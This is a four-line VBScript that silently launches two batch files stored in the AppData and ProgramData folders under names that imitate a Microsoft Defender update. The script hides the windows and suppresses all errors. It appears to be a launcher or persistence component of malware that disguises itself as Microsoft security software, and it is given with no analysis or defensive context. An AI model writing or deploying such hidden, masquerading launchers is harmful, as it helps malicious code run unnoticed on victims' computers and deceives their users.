On Error Resume Next
Set WshShell = WScript.CreateObject( "WScript.Shell" )
WshShell.Run "%APPDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat",0,True
WshShell.Run "%PROGRAMDATA%\MicrosoftDefenderUpdate\MicrosoftUpdate.bat",0,True
